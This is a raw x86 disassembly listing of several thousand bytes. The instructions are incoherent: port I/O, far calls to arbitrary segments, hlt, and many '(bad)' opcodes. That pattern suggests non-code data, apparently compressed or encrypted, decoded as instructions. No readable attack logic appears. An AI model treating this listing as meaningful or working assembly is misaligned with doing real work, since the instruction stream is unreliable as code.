  414bd5:	in     eax,dx
  414bd6:	mov    eax,0x7cd3664f
  414bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bdc:	popf   
  414bdd:	mov    esi,0x8a361b32
  414be2:	out    0x2d,al
  414be4:	mov    dl,0xba
  414be6:	push   edx
  414be7:	dec    ecx
  414be8:	rol    BYTE PTR [ebp+0x72],cl
  414beb:	xchg   edi,eax
  414bec:	jns    0x414bf9
  414bee:	fs inc bx
  414bf1:	iret   
  414bf2:	ficomp WORD PTR [edx-0x4c]
  414bf5:	mov    ebx,DWORD PTR [ecx-0x44ed4c34]
  414bfb:	xor    edi,ecx
  414bfd:	enter  0x7c8,0xf4
  414c01:	mov    edi,0xff1a7d2
  414c06:	mov    bl,0xb4
  414c08:	pop    es
  414c09:	lods   eax,DWORD PTR ds:[esi]
  414c0a:	in     eax,0xe6
  414c0c:	lods   eax,DWORD PTR ds:[esi]
  414c0d:	mov    ebx,0xf4fda8e
  414c12:	mov    edi,0x1af75760
  414c17:	xchg   edi,eax
  414c18:	xchg   ebx,eax
  414c19:	stos   BYTE PTR es:[edi],al
  414c1a:	add    BYTE PTR [edx+0x381bdfb4],bl
  414c20:	sub    esi,DWORD PTR [ebp+edi*4+0x1fe7c068]
  414c27:	shl    BYTE PTR [edx+0x32dc9eb0],0xbe
  414c2e:	popa   
  414c2f:	add    DWORD PTR [esi],0xb
  414c32:	cmc    
  414c33:	loopne 0x414bee
  414c35:	push   ecx
  414c36:	fcomp  DWORD PTR [esi-0x705b2738]
  414c3c:	inc    ebx
  414c3d:	or     edx,DWORD PTR [ebp-0x6c]
  414c40:	bound  ebp,QWORD PTR [ebp+eax*1+0x1]
  414c44:	scas   eax,DWORD PTR es:[edi]
  414c45:	or     eax,DWORD PTR [ebp+0x76]
  414c48:	push   esi
  414c49:	pushf  
  414c4a:	sbb    eax,DWORD PTR [ecx+eiz*8-0x32b66510]
  414c51:	push   0xffffffda
  414c53:	imul   ebx,DWORD PTR [ebx+edi*1],0x6340a7de
  414c5a:	and    al,0x43
  414c5c:	lods   eax,DWORD PTR ds:[esi]
  414c5d:	sub    DWORD PTR [ebp+0x3b3cbc83],edx
  414c63:	leave  
  414c64:	out    dx,eax
  414c65:	mov    BYTE PTR [ebx-0x71c4a9c],dh
  414c6b:	in     al,0xe7
  414c6d:	pop    ss
  414c6e:	lahf   
  414c6f:	cmp    bh,BYTE PTR [edx+0x2acbd14b]
  414c75:	and    DWORD PTR [esi+ebp*1],edi
  414c78:	mov    edx,ecx
  414c7a:	or     al,0x27
  414c7c:	jg     0x414c67
  414c7e:	not    DWORD PTR ds:0xa70985b1
  414c84:	js     0x414c2e
  414c86:	mov    esi,0xf80370c9
  414c8b:	push   es
  414c8c:	mov    dl,0x95
  414c8e:	jae    0x414ce3
  414c90:	adc    al,0xaf
  414c92:	sbb    eax,0xc80b9d8c
  414c97:	imul   ebp,DWORD PTR [ecx],0x3b
  414c9a:	or     edi,DWORD PTR [esi+0x70]
  414c9d:	lock mov dh,0xd6
  414ca0:	push   ebx
  414ca1:	rcr    DWORD PTR [edx+0x5c757504],0x9c
  414ca8:	dec    esi
  414ca9:	add    al,0x3b
  414cab:	jmp    0x1978:0x9fba1a5a
  414cb2:	call   0xae180fc3
  414cb7:	dec    ecx
  414cb8:	jp     0x414cc3
  414cba:	sub    al,BYTE PTR [esi-0x78]
  414cbd:	(bad)  
  414cbe:	out    0xa7,eax
  414cc0:	pop    ss
  414cc1:	push   0x54
  414cc3:	xchg   BYTE PTR [esi+0x3],al
  414cc6:	ret    0xb5b4
  414cc9:	sub    DWORD PTR [esi-0x45],ebx
  414ccc:	jp     0x414d3f
  414cce:	mov    edx,0x8c0a310b
  414cd3:	inc    ecx
  414cd4:	lods   eax,DWORD PTR ds:[esi]
  414cd5:	or     ebx,edi
  414cd7:	pushf  
  414cd8:	call   0x9a80:0x9fc413c6
  414cdf:	inc    eax
  414ce0:	mov    al,ds:0x688b0618
  414ce5:	mov    eax,ds:0x16ada7a0
  414cea:	daa    
  414ceb:	mov    bh,0xc8
  414ced:	push   edi
  414cee:	mov    ebp,0x8862b2e2
  414cf3:	sub    eax,0x7a46bb10
  414cf8:	or     bl,cl
  414cfa:	sub    BYTE PTR [esi+0x6c3677b8],ah
  414d00:	mov    dl,0x6e
  414d02:	fnstsw WORD PTR [esi-0x62]
  414d05:	push   esp
  414d06:	push   esp
  414d07:	and    al,0xa3
  414d09:	or     esp,DWORD PTR [edi+0x13dd822b]
  414d0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d10:	cwde   
  414d11:	and    al,0x9a
  414d13:	psubb  mm2,QWORD PTR [eax-0x5fc82317]
  414d1a:	sub    DWORD PTR [ecx-0x4315c122],ebp
  414d20:	repnz add eax,0x6e15364f
  414d26:	call   0xa673:0xf575f519
  414d2d:	add    ch,al
  414d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d30:	xor    dl,bl
  414d32:	jl     0x414d27
  414d34:	xchg   ebx,eax
  414d35:	mov    esp,0x554a61d4
  414d3a:	in     al,dx
  414d3b:	xor    al,0xc3
  414d3d:	jae    0x414cd9
  414d3f:	fwait
  414d40:	jo     0x414cf1
  414d42:	iret   
  414d43:	inc    edi
  414d44:	mov    bh,0x74
  414d46:	int    0xa7
  414d48:	sub    ch,al
  414d4a:	mov    ecx,DWORD PTR [esi-0x58]
  414d4d:	jno    0x414d54
  414d4f:	dec    edi
  414d50:	(bad)  
  414d51:	test   DWORD PTR [ebp+0x7746b3d8],0xe7d7046
  414d5b:	add    BYTE PTR [esi+0x7c],ah
  414d5e:	fisub  WORD PTR [edi-0x65064d28]
  414d64:	pop    eax
  414d65:	hlt    
  414d66:	je     0x414d46
  414d68:	mov    cl,0x5
  414d6a:	imul   edi,DWORD PTR [ebx],0x64cef58d
  414d70:	in     eax,dx
  414d71:	(bad)  
  414d72:	ficomp DWORD PTR [edi]
  414d74:	dec    edx
  414d75:	mov    esp,0x8826a08d
  414d7a:	mov    al,0xc7
  414d7c:	xchg   esp,eax
  414d7d:	mov    esp,ecx
  414d7f:	jno    0x414de2
  414d81:	out    dx,al
  414d82:	call   0x73df:0x84687c68
  414d89:	jecxz  0x414df6
  414d8b:	dec    ecx
  414d8c:	ret    0x360b
  414d8f:	or     al,0x5c
  414d91:	mov    bh,0x6e
  414d93:	shl    DWORD PTR [eax+0x76],1
  414d96:	call   0x9b26:0xc1290957
  414d9d:	(bad)  
  414d9e:	fs test al,0xaf
  414da1:	ret    
  414da2:	stos   BYTE PTR es:[edi],al
  414da3:	inc    ebx
  414da4:	repnz rcl ebx,1
  414da7:	mov    ah,BYTE PTR [ebx+0x4b0b9a49]
  414dad:	psubsw mm0,QWORD PTR [eax-0x5690d715]
  414db4:	jns    0x414def
  414db6:	sbb    DWORD PTR [edx+esi*8-0x61],esp
  414dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dbb:	(bad)  
  414dbc:	xchg   esi,eax
  414dbd:	fistp  WORD PTR [edx+0x4608f3ec]
  414dc3:	mov    esp,esp
  414dc5:	jl     0x414d5f
  414dc7:	mov    ecx,0xa9f27639
  414dcc:	sbb    al,0x8d
  414dce:	ins    BYTE PTR es:[edi],dx
  414dcf:	or     BYTE PTR [edx-0x107c9bbe],dh
  414dd5:	clc    
  414dd6:	dec    esp
  414dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dd8:	pop    edi
  414dd9:	test   eax,esi
  414ddb:	mov    bl,ch
  414ddd:	jp     0x414da2
  414ddf:	jne    0x414d93
  414de1:	pusha  
  414de2:	lahf   
  414de3:	sbb    BYTE PTR [eax-0x4cb03069],dh
  414de9:	jle    0x414e39
  414deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dec:	pop    esp
  414ded:	mov    al,0x5f
  414def:	ss sbb eax,ecx
  414df2:	adc    al,BYTE PTR [esi+0x35e6aeb2]
  414df8:	jae    0x414dd6
  414dfa:	sbb    esi,DWORD PTR [ebx]
  414dfc:	lods   al,BYTE PTR ds:[esi]
  414dfd:	or     esi,ebp
  414dff:	int3   
  414e00:	dec    ecx
  414e01:	jg     0x414e6d
  414e03:	mov    ds:0x419a5fb7,eax
  414e08:	cmp    al,0xbf
  414e0a:	adc    eax,0xd62489c9
  414e0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e10:	and    BYTE PTR ds:0xd0a2748e,ch
  414e16:	retf   
  414e17:	jns    0x414de7
  414e19:	(bad)  
  414e1a:	mov    ah,0x7d
  414e1c:	nop
  414e1d:	xchg   edi,eax
  414e1e:	fwait
  414e1f:	adc    eax,0x39d9340f
  414e24:	shl    ch,cl
  414e26:	sbb    BYTE PTR [edi+0x776c09bc],ah
  414e2c:	push   0xb01ce906
  414e31:	sbb    ebx,0x4d
  414e34:	xchg   BYTE PTR [ebx-0x391038f8],bh
  414e3a:	sbb    al,0xa7
  414e3c:	data16 sti 
  414e3e:	fsubrp st(1),st
  414e40:	inc    ebp
  414e41:	cmp    al,0xc0
  414e43:	cmp    dh,BYTE PTR [edx+0x22b8917f]
  414e49:	popa   
  414e4a:	jmp    0x334d1f3d
  414e4f:	mov    cl,0xf6
  414e51:	adc    ebx,ebp
  414e53:	outs   dx,DWORD PTR ds:[esi]
  414e54:	call   0xe6d5d589
  414e59:	fistp  WORD PTR [edx+0x57]
  414e5c:	cmp    eax,0x8afe1c7a
  414e61:	or     ecx,DWORD PTR [esi+0x45288bac]
  414e67:	sar    DWORD PTR [ebx-0x2f9365a8],0x8e
  414e6e:	repnz mov ecx,0x375aef88
  414e74:	pop    edi
  414e75:	xor    eax,0x7f7e3250
  414e7a:	call   0xc9d3:0x1a6baabc
  414e81:	xor    ebx,DWORD PTR [edx+0x195c7725]
  414e87:	cmc    
  414e88:	xchg   esi,eax
  414e89:	pop    edx
  414e8a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  414e8c:	sub    bh,BYTE PTR [eax-0x74]
  414e8f:	imul   esi,ebx
  414e92:	adc    DWORD PTR [edx+esi*4+0x2a],esi
  414e96:	dec    esp
  414e97:	mov    dh,0x82
  414e99:	mov    ah,0x50
  414e9b:	jmp    0x414ec3
  414e9d:	or     BYTE PTR [esi+0x187f7904],dl
  414ea3:	jmp    0xf9e3:0x5d9f1b4d
  414eaa:	call   0xbbac:0xbe6f080e
  414eb1:	lds    esi,FWORD PTR [esi-0x15357459]
  414eb7:	or     ch,BYTE PTR [eax]
  414eb9:	pusha  
  414eba:	stos   BYTE PTR es:[edi],al
  414ebb:	pusha  
  414ebc:	cli    
  414ebd:	and    BYTE PTR [ecx-0x7745482e],0x92
  414ec4:	mov    ebx,0x306665dc
  414ec9:	in     al,dx
  414eca:	sub    BYTE PTR [edi+0x46],bh
  414ecd:	ficomp DWORD PTR [ecx-0x66bfe528]
  414ed3:	out    dx,al
  414ed4:	dec    edi
  414ed5:	or     eax,DWORD PTR [ebp+esi*8+0x7235b47b]
  414edc:	mov    edi,0xbc289abc
  414ee1:	call   0xa7c6:0xcaac1ecf
  414ee8:	pop    esp
  414ee9:	adc    BYTE PTR [edi+eiz*8],cl
  414eec:	enter  0x990c,0xe4
  414ef0:	mov    dl,0xa0
  414ef2:	push   esi
  414ef3:	jl     0x414f34
  414ef5:	jle    0x414edb
  414ef7:	mov    BYTE PTR [ebx+0xb],bh
  414efa:	xor    eax,0x6a646c34
  414eff:	int    0xf
  414f01:	mov    ch,0x9d
  414f03:	pop    edi
  414f04:	and    bh,ch
  414f06:	mov    ebp,0x1a51000b
  414f0b:	addr16 cmp ecx,esp
  414f0e:	sub    BYTE PTR [ebx+ebx*4-0x559576f8],ah
  414f15:	pop    ecx
  414f16:	pop    edx
  414f17:	fidivr DWORD PTR ds:0xef179de7
  414f1d:	mov    esp,DWORD PTR [esi-0x602c0da3]
  414f23:	push   ecx
  414f24:	and    al,0xa
  414f26:	cmc    
  414f27:	mov    edi,0x8f87e991
  414f2c:	mov    ebp,DWORD PTR [edx-0x4d]
  414f2f:	jnp    0x414f4d
  414f31:	mov    bl,BYTE PTR [ebx-0x4b3dfba9]
  414f37:	scas   eax,DWORD PTR es:[edi]
  414f38:	mov    eax,0xad9872c6
  414f3d:	or     ebx,esp
  414f3f:	adc    dl,cl
  414f41:	inc    ecx
  414f42:	aaa    
  414f43:	jno    0x414f01
  414f45:	or     al,0x9a
  414f47:	sar    DWORD PTR [edi-0x15e0036],1
  414f4d:	sbb    edx,ecx
  414f4f:	test   al,0x9d
  414f51:	add    DWORD PTR ds:0xf29cd234,esp
  414f57:	dec    ebp
  414f58:	sbb    eax,0xdbbe9aa6
  414f5d:	fnstenv [ecx+0x1b]
  414f60:	mov    ebx,0x74a7a3a5
  414f65:	jae    0x414fd3
  414f67:	push   eax
  414f68:	jp     0x414f35
  414f6a:	mov    ah,0x79
  414f6c:	mov    dl,0x83
  414f6e:	cmp    ah,BYTE PTR [ebx+0xa09da20]
  414f74:	mov    ecx,0x28a7587b
  414f79:	jnp    0x414fbd
  414f7b:	out    dx,eax
  414f7c:	daa    
  414f7d:	imul   edx,DWORD PTR [esi-0x24b84de2],0x12cf1245
  414f87:	(bad)  
  414f88:	loop   0x414f96
  414f8a:	nop
  414f8b:	and    al,0x4
  414f8d:	jmp    DWORD PTR ds:0xa742af7
  414f93:	es pop esp
  414f95:	sti    
  414f96:	jbe    0x414f62
  414f98:	mov    dl,0x60
  414f9a:	jo     0x414f5e
  414f9c:	or     DWORD PTR [edi-0x57],ebx
  414f9f:	xor    dl,dl
  414fa1:	or     edi,DWORD PTR ds:0x581fbba0
  414fa7:	sub    eax,0x969a6dff
  414fac:	cmp    esp,DWORD PTR [edi-0x75d4a3f4]
  414fb2:	inc    esi
  414fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fb4:	lods   eax,DWORD PTR ds:[esi]
  414fb5:	push   edx
  414fb6:	pop    esp
  414fb7:	jg     0x414f51
  414fb9:	dec    esp
  414fba:	icebp  
  414fbb:	stos   BYTE PTR es:[edi],al
  414fbc:	(bad)  
  414fbd:	cmc    
  414fbe:	or     edx,edx
  414fc0:	mov    dl,0x78
  414fc2:	jmp    0x45a0:0x4b014f4f
  414fc9:	ja     0x41500f
  414fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fcc:	jge    0x414fe9
  414fce:	jmp    0x414f66
  414fd0:	std    
  414fd1:	mov    ebp,es
  414fd3:	and    eax,0x12419eb2
  414fd8:	mov    edi,eax
  414fda:	cmp    eax,0x170b4892
  414fdf:	scas   al,BYTE PTR es:[edi]
  414fe0:	inc    ebp
  414fe1:	sar    DWORD PTR [eax],1
  414fe3:	push   ss
  414fe4:	push   edx
  414fe5:	inc    ebp
  414fe6:	loop   0x41500b
  414fe8:	mov    dl,0x11
  414fea:	bound  esi,QWORD PTR [ebp-0x6b7e0bdb]
  414ff0:	push   esi
  414ff1:	or     ecx,DWORD PTR [esi-0x48]
  414ff4:	les    edi,FWORD PTR [esi]
  414ff6:	leave  
  414ff7:	bound  eax,QWORD PTR [edx]
  414ff9:	jne    0x414f95
  414ffb:	sub    ah,BYTE PTR [ebx+0x4e5831cf]
  415001:	pop    ds
  415002:	aad    0xa7
  415004:	pop    ebx
  415005:	imul   edx,DWORD PTR [ebp+0x47],0xffffffab
  415009:	adc    al,0xd3
  41500b:	and    dh,BYTE PTR [edx+0x6e6d0896]
  415011:	push   esi
  415012:	and    dh,dl
  415014:	jno    0x415021
  415016:	clc    
  415017:	arpl   WORD PTR [edi],sp
  415019:	inc    eax
  41501a:	repz pop ebp
  41501c:	test   DWORD PTR [eax+0x75a3039a],ecx
  415022:	outs   dx,BYTE PTR ds:[esi]
  415023:	aad    0xb4
  415025:	mov    ch,0xc9
  415027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415028:	jb     0x414ff9
  41502a:	mov    WORD PTR [esi+ebx*2],?
  41502d:	mov    WORD PTR [edx+0x66],es
  415030:	mov    ?,WORD PTR ds:0xb3f9bff
  415036:	sar    DWORD PTR [ebp-0x54],1
  415039:	jmp    0xaac78b1
  41503e:	and    esp,eax
  415040:	mov    ch,0x20
  415042:	or     ah,ch
  415044:	push   0xfffffff3
  415046:	pop    ebp
  415047:	aas    
  415048:	mov    bl,0xfd
  41504a:	lods   al,BYTE PTR ds:[esi]
  41504b:	(bad)  
  41504d:	fmul   st(1),st
  41504f:	into   
  415050:	dec    edi
  415051:	push   ss
  415052:	mov    edx,0x67161f60
  415057:	stos   BYTE PTR es:[edi],al
  415058:	mov    ecx,0xb6cce30b
  41505d:	cmp    eax,0x63b286e0
  415062:	in     eax,0xf5
  415064:	push   es
  415065:	jbe    0x4150cd
  415067:	pmulhuw mm5,QWORD PTR ds:0xbb80b82
  41506e:	addr16 mov ch,0x88
  415071:	dec    eax
  415072:	(bad)  
  415073:	int    0xb2
  415075:	ds push ds
  415077:	cmc    
  415078:	inc    esi
  415079:	into   
  41507a:	pushf  
  41507b:	mov    ebp,0xa7a9726d
  415080:	fwait
  415081:	imul   esi,DWORD PTR [esi-0x42],0xa9223fef
  415088:	mov    bl,0xab
  41508a:	mov    ah,BYTE PTR ds:0x35168abd
  415090:	add    BYTE PTR [ebx+edi*2-0x1c2ff259],0x3c
  415098:	hlt    
  415099:	icebp  
  41509a:	mov    cl,0x7b
  41509c:	adc    ch,BYTE PTR [eax+ecx*2-0x2d314d49]
  4150a3:	push   es
  4150a4:	jl     0x4150b9
  4150a6:	hlt    
  4150a7:	jg     0x41502f
  4150a9:	or     ecx,DWORD PTR [edi-0x68]
  4150ac:	pop    ss
  4150ad:	call   0x7b9a:0x53704136
  4150b4:	push   ebx
  4150b5:	mov    bl,0x50
  4150b7:	ins    BYTE PTR es:[edi],dx
  4150b8:	neg    BYTE PTR [edi]
  4150ba:	das    
  4150bb:	aam    0x25
  4150bd:	jbe    0x415098
  4150bf:	mov    al,ds:0xbd629df
  4150c4:	mov    esp,0x722fd268
  4150c9:	or     al,0xc6
  4150cb:	jg     0x4150f2
  4150cd:	or     ebx,DWORD PTR [edi-0x2ebe63d7]
  4150d3:	mov    al,ds:0x31bf0951
  4150d8:	in     eax,0x8b
  4150da:	(bad)  
  4150db:	sbb    eax,0x499a4983
  4150e0:	cli    
  4150e1:	mov    eax,0x8cc71027
  4150e6:	in     eax,dx
  4150e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150e8:	cmp    eax,0x92f46bff
  4150ed:	sub    al,0x87
  4150ef:	xor    BYTE PTR [edx-0x64133165],dh
  4150f5:	stos   DWORD PTR es:[edi],eax
  4150f6:	aaa    
  4150f7:	mov    al,ds:0xc5f60bac
  4150fc:	in     al,0x12
  4150fe:	out    0x72,al
  415100:	push   ecx
  415101:	into   
  415102:	call   0xa9a6:0x572e1ec7
  415109:	pusha  
  41510a:	fisub  WORD PTR [edi+0x3b7a32bc]
  415110:	jle    0x415171
  415112:	sbb    BYTE PTR [edx-0x339d8f6a],0xae
  415119:	out    dx,eax
  41511a:	fiadd  DWORD PTR [ecx]
  41511c:	push   ecx
  41511d:	inc    esp
  41511e:	push   ebp
  41511f:	jp     0x415169
  415121:	add    al,0xc5
  415123:	fs int3 
  415125:	pop    edx
  415126:	jns    0x415151
  415128:	jnp    0x4150b1
  41512a:	and    dh,BYTE PTR [edx+0x19a8e96]
  415130:	loop   0x415124
  415132:	fld    st(6)
  415134:	sub    BYTE PTR [esi+0xb],0xa7
  415138:	fild   DWORD PTR fs:0xba183fd3
  41513f:	scas   eax,DWORD PTR es:[edi]
  415140:	mov    dl,0x5f
  415142:	cmp    cl,BYTE PTR [ecx-0x5e42e8bd]
  415148:	push   eax
  415149:	or     ecx,DWORD PTR [esi-0x29d821d9]
  41514f:	idiv   BYTE PTR [edi]
  415151:	dec    esi
  415152:	call   0x72c4:0xb096c9cd
  415159:	jmp    0x4151a4
  41515b:	fadd   DWORD PTR [ecx-0x392048a9]
  415161:	or     bl,BYTE PTR ds:0x166a8525
  415167:	jo     0x415119
  415169:	cmp    esi,esi
  41516b:	push   eax
  41516c:	mov    ch,0xc0
  41516e:	push   esi
  41516f:	jmp    0xcceb9b76
  415174:	aaa    
  415175:	ficom  DWORD PTR [ebp-0x5b]
  415178:	fsub   st(1),st
  41517a:	mov    ecx,0xda33ec70
  41517f:	dec    esi
  415180:	xor    ecx,esp
  415182:	call   0x35e9:0xa4e554f1
  415189:	and    DWORD PTR [ebx+0x537adc4f],edi
  41518f:	mov    al,ds:0x24ffc957
  415194:	gs retf 
  415196:	adc    ah,BYTE PTR gs:[eax]
  415199:	xchg   esi,eax
  41519a:	call   0x55fa:0x26c62a90
  4151a1:	and    bl,bl
  4151a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a4:	xchg   esi,eax
  4151a5:	push   DWORD PTR [esi-0x12a7b6f0]
  4151ab:	xchg   ebx,eax
  4151ac:	mov    dl,0x19
  4151ae:	iret   
  4151af:	test   esi,0xd6551605
  4151b5:	or     esi,DWORD PTR [ebx]
  4151b7:	jnp    0x4151d6
  4151b9:	les    edi,FWORD PTR [eax+0x6a]
  4151bc:	pushf  
  4151bd:	loope  0x4151c6
  4151bf:	(bad)  
  4151c0:	sbb    DWORD PTR [ebx],esp
  4151c2:	scas   al,BYTE PTR es:[edi]
  4151c3:	popf   
  4151c4:	mov    al,0xd0
  4151c6:	sbb    eax,0xa2c08872
  4151cb:	in     al,0x62
  4151cd:	push   esi
  4151ce:	push   0xffffffff
  4151d0:	ret    
  4151d1:	pop    es
  4151d2:	mov    BYTE PTR [esi],ch
  4151d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151d5:	add    esp,DWORD PTR [ecx]
  4151d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151d8:	xor    DWORD PTR [ebx-0x1ba16fdb],eax
  4151de:	mov    dh,0x80
  4151e0:	dec    esp
  4151e1:	enter  0x3f9a,0xc8
  4151e5:	xchg   ebp,eax
  4151e6:	in     al,dx
  4151e7:	push   edi
  4151e8:	aas    
  4151e9:	or     ecx,DWORD PTR [ecx+ecx*1]
  4151ec:	xlat   BYTE PTR ds:[ebx]
  4151ed:	xor    ebx,0x1e
  4151f0:	out    dx,al
  4151f1:	rcr    BYTE PTR [edx-0xd0a02d0],0xc3
  4151f8:	mov    esp,DWORD PTR [eiz*4+0x310b31d2]
  4151ff:	jmp    0x4151cc
  415201:	ficom  WORD PTR [edi]
  415203:	xor    al,0xf7
  415205:	enter  0x9a9a,0xdd
  415209:	cs hlt 
  41520b:	cmp    DWORD PTR [eax],ebp
  41520d:	jne    0x415209
  41520f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415210:	push   esi
  415211:	shl    BYTE PTR [eax],1
  415213:	cwde   
  415214:	(bad)  
  415215:	ja     0x4151d4
  415217:	pop    esi
  415218:	mov    dl,0xa5
  41521a:	ja     0x4151af
  41521c:	xchg   esp,eax
  41521d:	dec    BYTE PTR [ecx]
  41521f:	inc    esp
  415220:	fst    DWORD PTR [esi]
  415222:	and    DWORD PTR [ebx-0x66247497],0x31
  415229:	popf   
  41522a:	out    dx,eax
  41522b:	ds mov dl,0xe7
  41522e:	or     ebp,DWORD PTR [ecx]
  415230:	or     DWORD PTR [ecx+0xb77fb44],ecx
  415236:	add    al,0x8e
  415238:	sbb    BYTE PTR [esi],bh
  41523a:	adc    BYTE PTR [edx],ah
  41523c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41523d:	jnp    0x41527a
  41523f:	jne    0x4151e2
  415241:	out    dx,eax
  415242:	pop    esp
  415243:	xor    DWORD PTR [edx+0x5b9b0878],esi
  415249:	xchg   edi,eax
  41524a:	xchg   esi,eax
  41524b:	xchg   edi,eax
  41524c:	outs   dx,DWORD PTR ds:[esi]
  41524d:	push   ss
  41524e:	push   ss
  41524f:	push   edi
  415250:	fimul  DWORD PTR [ebx-0x5f]
  415253:	in     al,0xbb
  415255:	rol    edi,0x8b
  415258:	mov    ebp,0xe6033481
  41525d:	retf   
  41525e:	push   esp
  41525f:	not    esp
  415261:	inc    edi
  415262:	pop    ecx
  415263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415264:	adc    DWORD PTR [ecx],esi
  415266:	pushf  
  415267:	inc    ecx
  415268:	and    BYTE PTR [eax+0xa],dl
  41526b:	aad    0x3b
  41526d:	sbb    eax,0xcb79e29a
  415272:	ror    DWORD PTR [ebx+ebx*1],cl
  415275:	cs jno 0x41521f
  415278:	out    0xc9,eax
  41527a:	xchg   DWORD PTR [esi],edi
  41527c:	add    ch,ch
  41527e:	les    eax,FWORD PTR [esi-0x54]
  415281:	xchg   ebx,eax
  415282:	pop    edi
  415283:	enter  0x37b2,0x4e
  415287:	mov    ds,WORD PTR [edx+0x6ba79e1e]
  41528d:	cli    
  41528e:	or     BYTE PTR [eax],ch
  415290:	idiv   BYTE PTR [edi+0x2ab24137]
  415296:	jmp    0x430:0x5606b9fb
  41529d:	or     al,0x9b
  41529f:	push   ecx
  4152a0:	sahf   
  4152a1:	sub    BYTE PTR [ebx-0x2c751859],dh
  4152a7:	clc    
  4152a8:	mov    dl,0x1d
  4152aa:	and    eax,0x2b04bcd1
  4152af:	push   ebx
  4152b0:	push   ds
  4152b1:	or     dl,BYTE PTR [esi+0x5b]
  4152b4:	fs xchg ch,bl
  4152b7:	sbb    eax,0x3b393b18
  4152bc:	pushf  
  4152bd:	stc    
  4152be:	stos   BYTE PTR es:[edi],al
  4152bf:	pop    esi
  4152c0:	mov    dl,0xe6
  4152c2:	hlt    
  4152c3:	iret   
  4152c4:	xchg   DWORD PTR ds:0xce713fbe,edx
  4152ca:	clc    
  4152cb:	loope  0x4152c2
  4152cd:	retf   
  4152ce:	mov    ds:0x957089e3,al
  4152d3:	pop    ds
  4152d4:	xor    dh,BYTE PTR [eax+0x41abe798]
  4152da:	add    BYTE PTR [esi-0x63],bh
  4152dd:	or     esi,DWORD PTR [ecx-0x39]
  4152e0:	dec    eax
  4152e1:	mov    ecx,0xa97eccc3
  4152e6:	call   0x4db8:0x9b5b1afc
  4152ed:	pop    esi
  4152ee:	sahf   
  4152ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152f0:	ror    BYTE PTR [ecx+ebx*2-0x18],0x57
  4152f5:	test   al,0xe5
  4152f7:	ds mov dl,0x90
  4152fa:	inc    edx
  4152fb:	add    eax,0xeb218686
  415300:	lahf   
  415301:	or     al,0xf
  415303:	mov    WORD PTR [edx],es
  415305:	sub    BYTE PTR ds:0xe31a9da7,bl
  41530b:	sub    esi,DWORD PTR [edx-0x785dc7d7]
  415311:	fdivrp st(6),st
  415313:	push   ebx
  415314:	pop    edx
  415315:	or     edi,DWORD PTR [ebp+edi*2-0x932a88a]
  41531c:	jmp    0x415350
  41531e:	(bad)  
  41531f:	xchg   esi,eax
  415320:	sub    al,0x14
  415322:	mov    BYTE PTR [edx+esi*2-0x57508456],bl
  415329:	xchg   esp,eax
  41532a:	pusha  
  41532b:	mov    ah,0xb0
  41532d:	aam    0x56
  41532f:	sbb    DWORD PTR [edx-0x5e0a5fb3],esi
  415335:	ret    
  415336:	push   ebp
  415337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415338:	jno    0x4152c8
  41533a:	ret    
  41533b:	mov    ch,0x68
  41533d:	mov    eax,ds:0xdab29c98
  415342:	sub    eax,0xabb2f74d
  415347:	test   eax,0xa0f7bb0e
  41534c:	inc    ebx
  41534d:	pop    edx
  41534e:	inc    ecx
  41534f:	mov    esp,0xd6382b73
  415354:	jp     0x41539c
  415356:	retf   0x2ee
  415359:	aas    
  41535a:	jp     0x415376
  41535c:	mov    dl,0x1e
  41535e:	xchg   edx,eax
  41535f:	mov    BYTE PTR [edx-0x26],dh
  415362:	ins    BYTE PTR es:[edi],dx
  415363:	or     ebx,ecx
  415365:	xor    ebx,esp
  415367:	dec    eax
  415368:	mov    cl,0x82
  41536a:	(bad)
  41536d:	lahf   
  41536e:	jp     0x41539c
  415370:	xchg   DWORD PTR [ebp-0x66],esi
  415373:	ja     0x4153ee
  415375:	ins    BYTE PTR es:[edi],dx
  415376:	mov    bl,0x5d
  415378:	xlat   BYTE PTR ds:[ebx]
  415379:	jg     0x415362
  41537b:	test   al,0xc3
  41537d:	mov    al,ds:0xe2526fec
  415382:	sub    edx,DWORD PTR ds:[ebx+esi*8+0x7e5022a4]
  41538a:	call   0xe00e:0x5c8313c2
  415391:	add    ch,BYTE PTR [edx-0x1]
  415394:	push   edi
  415395:	leave  
  415396:	call   0x99b9:0x86d3b932
  41539d:	shl    dl,cl
  41539f:	fbstp  TBYTE PTR [edx+0x134789ba]
  4153a5:	inc    ecx
  4153a6:	pop    ecx
  4153a7:	(bad)  
  4153a8:	or     DWORD PTR [ebx],ecx
  4153aa:	idiv   esi
  4153ac:	imul   esp,DWORD PTR [esp+ecx*8-0x6522ab63],0x27b72f88
  4153b7:	push   0xa72f781a
  4153bc:	mov    esp,0x69ec8ec7
  4153c1:	push   ds
  4153c2:	jl     0x4153a8
  4153c4:	mov    ebp,0x9d6676eb
  4153c9:	jmp    0x4153cb
  4153cb:	and    eax,0xa796a5e1
  4153d0:	neg    cl
  4153d2:	ret    0xa3f2
  4153d5:	ja     0x4153aa
  4153d7:	leave  
  4153d8:	mov    dl,0x1f
  4153da:	sahf   
  4153db:	stos   BYTE PTR es:[edi],al
  4153dc:	(bad)  
  4153dd:	retf   0x567c
  4153e0:	mov    ebp,0x2d1dbd08
  4153e5:	push   esi
  4153e6:	pop    es
  4153e7:	push   0x22
